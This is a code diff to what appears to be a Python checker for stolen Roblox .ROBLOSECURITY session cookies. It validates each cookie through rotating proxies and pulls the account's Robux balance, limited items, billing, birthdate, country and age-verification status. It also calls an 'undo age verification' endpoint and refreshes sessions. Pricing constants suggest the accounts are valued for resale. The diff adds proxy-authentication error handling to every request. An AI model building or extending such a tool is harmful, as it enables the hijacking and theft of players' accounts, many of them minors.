@@ -23,6 +23,11 @@ def _make_ssl_ctx() -> ssl.SSLContext:
     return ctx
 
 _SSL_CTX = _make_ssl_ctx()
+def _is_proxy_auth_error(exc: Exception) -> bool:
+    s = str(exc).lower()
+    return "407" in s or "proxy authentication required" in s or "proxy_auth" in s
+
+
 from config import HTML_TEMPLATE
 from config import COOKIE_PATTERN, REQUEST_TIMEOUT, TARGET_ITEMS, HEADLESS_ID, KORBLOX_ID, GAMES, BADGES_PER_GAME, GAMEPASSES_PER_GAME, _RAP_RANGES, _DONATE_RANGES, _LIFETIME_RANGES, _BALANCE_RANGES, _BADGES_RANGES, _GAMEPASSES_RANGES, _BILLING_RANGES, TEMP_DIR, USER_AGENTS, UNIVERSE_IDS, _PLAYTIME_RANGES, EMOJI_GAMES # Импорт из config.py
 from config import VALIDATE_SEMAPHORE, STATS_SEMAPHORE, FRESH_SEMAPHORE, PER_PROXY_LIMIT, PROXY_MAX_FAILS, PROXY_COOLDOWN_SEC
@@ -32,6 +37,34 @@ from config import (PRICE_PER_1K_ROBUX, PRICE_GROUP_DISCOUNT, PRICE_PER_1K_RAP, 
                     PRICE_COMBO, PRICE_COMBO_DISCOUNT, PRICE_PREMIUM, PRICE_ACTIVE_MIN_MINUTES)
 from proxy_pool import ProxyPool
 from database import get_user_custom_configs
+# Прокси хелпер — 407 fix (webshare http: требует proxy_auth отдельно)
+try:
+    from utils import get_proxy_aiohttp_params
+except ImportError:
+    def get_proxy_aiohttp_params(proxy_url):
+        if not proxy_url:
+            return {}
+        try:
+            import aiohttp, urllib.parse
+            parsed = urllib.parse.urlparse(proxy_url)
+            if parsed.username:
+                import urllib.parse as up
+                user = up.unquote(parsed.username)
+                pwd = up.unquote(parsed.password or "")
+                auth = aiohttp.BasicAuth(user, pwd)
+                host = parsed.hostname or ""
+                is_ipv6 = ":" in host and not host.startswith("[")
+                had_brackets = "[" in (proxy_url or "")
+                if is_ipv6:
+                    host = f"[{host}]"
+                port = parsed.port
+                scheme = parsed.scheme or "http"
+                clean = f"{scheme}://{host}:{port}" if port else f"{scheme}://{host}"
+                return {"proxy": clean, "proxy_auth": auth}
+            else:
+                return {"proxy": proxy_url}
+        except Exception:
+            return {"proxy": proxy_url}
 request_semaphore = asyncio.Semaphore(max(8, min(MAX_CONCURRENT_REQUESTS, 256)))
 class CookieProcessor:
     def __init__(self):
@@ -128,7 +161,7 @@ class CookieProcessor:
                             "https://www.roblox.com/my/settings/json",
                             headers=headers,
                             cookies={".ROBLOSECURITY": cookie},
-                            proxy=current_proxy,
+                            **get_proxy_aiohttp_params(current_proxy),
                             allow_redirects=True,
                             timeout=aiohttp.ClientTimeout(
                                 total=max(8, REQUEST_TIMEOUT),
@@ -202,6 +235,24 @@ class CookieProcessor:
                     delay = min(delay * 1.5, 4)
                     continue
 
+            except aiohttp.ClientHttpProxyError as e:
+                # 407 Proxy Auth Required — webshare free часто протухают или логин/пароль неверный
+                if getattr(e, 'status', None) == 407 or "407" in str(e):
+                    # дедупликация логов 407 — не спамим каждый раз одним прокси
+                    try:
+                        _seen_407 = getattr(self, "_logged_407", set())
+                        if current_proxy not in _seen_407:
+                            logging.warning(f"🔑 407 Proxy Auth Failed ...{current_proxy[-24:] if current_proxy else 'None'} — проверь webshare: обнови proxies.txt, IP whitelist, тип HTTP vs SOCKS")
+                            _seen_407.add(current_proxy)
+                            self._logged_407 = _seen_407
+                    except Exception:
+                        pass
+                    return {"valid": False, "proxy_failed": True, "proxy_auth_failed": True}
+                logging.warning(f"🍪 Прокси ошибка (попытка {attempt + 1}): {e}")
+                if attempt < max_retries:
+                    await asyncio.sleep(delay)
+                    delay = min(delay * 1.5, 4)
+                    continue
             except aiohttp.ClientConnectorError as e:
                 error_str = str(e).lower()
                 if "resolve hostname" in error_str or "name or service not known" in error_str:
@@ -214,6 +265,16 @@ class CookieProcessor:
                     continue
 
             except Exception as e:
+                if _is_proxy_auth_error(e):
+                    try:
+                        _seen_407 = getattr(self, "_logged_407", set())
+                        if current_proxy not in _seen_407:
+                            logging.warning(f"🔑 407 Proxy Auth в validate — ...{current_proxy[-20:] if current_proxy else 'None'} : {e}")
+                            _seen_407.add(current_proxy)
+                            self._logged_407 = _seen_407
+                    except Exception:
+                        pass
+                    return {"valid": False, "proxy_failed": True, "proxy_auth_failed": True}
                 logging.error(f"🍪 Неожиданная ошибка при валидации: {e}")
                 if attempt < max_retries:
                     await asyncio.sleep(delay)
@@ -242,7 +303,7 @@ class CookieProcessor:
                         balance_resp = await session.get(
                             f"https://economy.roblox.com/v1/users/{user_id}/currency",
                             cookies={".ROBLOSECURITY": cookie},
-                            proxy=proxy,
+                            **get_proxy_aiohttp_params(proxy),
                             headers={"User-Agent": random.choice(USER_AGENTS)},
                             timeout=aiohttp.ClientTimeout(total=20)
                         )
@@ -275,7 +336,7 @@ class CookieProcessor:
                         pending_resp = await session.get(
                             pending_url,
                             cookies={".ROBLOSECURITY": cookie},
-                            proxy=proxy,
+                            **get_proxy_aiohttp_params(proxy),
                             headers={"User-Agent": random.choice(USER_AGENTS)},
                             timeout=aiohttp.ClientTimeout(total=20)
                         )
@@ -367,7 +428,11 @@ class CookieProcessor:
                         return {"valid": False, "error": str(e)}
                     finally:
                         ok = isinstance(result, dict) and not result.get('proxy_failed')
-                        pool.release(proxy, success=ok)
+                        auth_failed = isinstance(result, dict) and result.get('proxy_auth_failed')
+                        if auth_failed:
+                            pool.release(proxy, success=False, auth_failed=True)
+                        else:
+                            pool.release(proxy, success=ok)
                         completed += 1
                         if progress_callback:
                             try:
@@ -465,7 +530,7 @@ class CookieProcessor:
                     async with session.get(
                         url,
                         cookies={'.ROBLOSECURITY': cookie},
-                        proxy=donate_proxy,
+                        **get_proxy_aiohttp_params(donate_proxy),
                         timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
                     ) as response:
                         if response.status == 200:
@@ -787,7 +852,7 @@ class CookieProcessor:
             async with session.get(
                 "https://apis.roblox.com/parental-controls-api/v1/parental-controls/get-top-weekly-screentime-by-universe",
                 cookies={'.ROBLOSECURITY': cookie},
-                proxy=proxy_url,
+                **get_proxy_aiohttp_params(proxy_url),
                 timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
             ) as response:
                 if response.status == 200:
@@ -824,7 +889,7 @@ class CookieProcessor:
             async with session.get(
                 'https://www.roblox.com/my/settings/json',
                 cookies={'.ROBLOSECURITY': cookie},
-                proxy=proxy_url,
+                **get_proxy_aiohttp_params(proxy_url),
                 timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
             ) as response:
                 if response.status == 200:
@@ -892,7 +957,7 @@ class CookieProcessor:
                 async with session.get(
                     url,
                     cookies={".ROBLOSECURITY": cookie},
-                    proxy=cur_proxy,
+                    **get_proxy_aiohttp_params(cur_proxy),
                     timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
                 ) as response:
                     if response.status == 200 and response.content_type == 'application/json':
@@ -952,7 +1017,7 @@ class CookieProcessor:
                 async with session.get(
                     url,
                     cookies={'.ROBLOSECURITY': cookie},
-                    proxy=cur_proxy,
+                    **get_proxy_aiohttp_params(cur_proxy),
                     timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
                 ) as response:
                     if response.status == 200:
@@ -1104,7 +1169,7 @@ class CookieProcessor:
                     async with session.get(
                         url,
                         cookies={'.ROBLOSECURITY': cookie},
-                        proxy=proxy,
+                        **get_proxy_aiohttp_params(proxy),
                         timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
                     ) as response:
                         if response.status == 200:
@@ -1275,7 +1340,7 @@ class CookieProcessor:
                         async with session.get(
                             url,
                             cookies={'.ROBLOSECURITY': cookie},
-                            proxy=proxy_url,
+                            **get_proxy_aiohttp_params(proxy_url),
                             timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
                         ) as response:
                             if response.status == 429:
@@ -1374,7 +1439,7 @@ class CookieProcessor:
             async with session.get(
                 f'https://inventory.roblox.com/v1/users/{user_id}/items/Asset/{item_id}',
                 cookies={'.ROBLOSECURITY': cookie},
-                proxy=proxy_url,
+                **get_proxy_aiohttp_params(proxy_url),
                 timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
             ) as response:
                 if response.status == 200:
@@ -1490,7 +1555,7 @@ class CookieProcessor:
                     async with session.get(
                         url,
                         cookies={'.ROBLOSECURITY': cookie},
-                        proxy=proxy,
+                        **get_proxy_aiohttp_params(proxy),
                         timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
                     ) as response:
                         if response.status == 429:  # Rate limit
@@ -1517,7 +1582,7 @@ class CookieProcessor:
                             
                             async with session.get(
                                 visits_url,
-                                proxy=proxy,
+                                **get_proxy_aiohttp_params(proxy),
                                 timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
                             ) as visits_response:
                                 if visits_response.status == 200:
@@ -1567,7 +1632,7 @@ class CookieProcessor:
             async with session.get(
                 "https://apis.roblox.com/age-verification-service/v1/age-verification/verified-age",
                 cookies={'.ROBLOSECURITY': cookie},
-                proxy=proxy_url,
+                **get_proxy_aiohttp_params(proxy_url),
                 timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
             ) as resp:
                 status = resp.status
@@ -1626,7 +1691,7 @@ class CookieProcessor:
             async with session.get(
                 "https://apis.roblox.com/age-verification-service/v1/age-verification/undo-age-verification-eligibility",
                 cookies={'.ROBLOSECURITY': cookie},
-                proxy=proxy_url,
+                **get_proxy_aiohttp_params(proxy_url),
                 timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
             ) as resp:
                 if resp.status == 200:
@@ -1707,7 +1772,7 @@ class CookieProcessor:
             async with session.get(
                 f"https://accountinformation.roblox.com/v1/birthdate",
                 cookies={'.ROBLOSECURITY': cookie},
-                proxy=proxy_url,
+                **get_proxy_aiohttp_params(proxy_url),
                 timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
             ) as resp:
                 if resp.status == 200:
@@ -1724,7 +1789,7 @@ class CookieProcessor:
             async with session.get(
                 "https://accountsettings.roblox.com/v1/account/settings/account-country",
                 cookies={'.ROBLOSECURITY': cookie},
-                proxy=proxy_url,
+                **get_proxy_aiohttp_params(proxy_url),
                 timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
             ) as resp:
                 if resp.status == 200:
@@ -1764,7 +1829,7 @@ class CookieProcessor:
             async with session.get(
                 f"https://accountsettings.roblox.com/v1/trade-privacy",
                 cookies={'.ROBLOSECURITY': cookie},
-                proxy=proxy_url,
+                **get_proxy_aiohttp_params(proxy_url),
                 timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
             ) as resp:
                 if resp.status == 200:
@@ -2841,7 +2906,7 @@ class CookieProcessor:
                     json=payload,
                     headers=headers,
                     cookies={".ROBLOSECURITY": cookie},
-                    proxy=fixed_proxy,
+                    **get_proxy_aiohttp_params(fixed_proxy),
                     timeout=aiohttp.ClientTimeout(total=40)
                 ) as response:
                     logging.info(f"Ответ получен: статус {response.status}")
@@ -2899,7 +2964,7 @@ class CookieProcessor:
                         "Accept": "application/json",
                         "Referer": "https://www.roblox.com/"
                     },
-                    proxy=proxy,
+                    **get_proxy_aiohttp_params(proxy),
                     timeout=aiohttp.ClientTimeout(total=30)
                 ) as response:
                     if response.status in (200, 403):
@@ -3027,7 +3092,7 @@ class CookieProcessor:
                     "https://auth.roblox.com/v2/session/refresh",  # ← НОВЫЙ ЭНДПОИНТ
                     headers=headers,
                     cookies={".ROBLOSECURITY": cookie},
-                    proxy=fixed_proxy,
+                    **get_proxy_aiohttp_params(fixed_proxy),
                     timeout=aiohttp.ClientTimeout(total=40)
                 ) as response:
                     logging.info(f"Ответ: статус {response.status}")
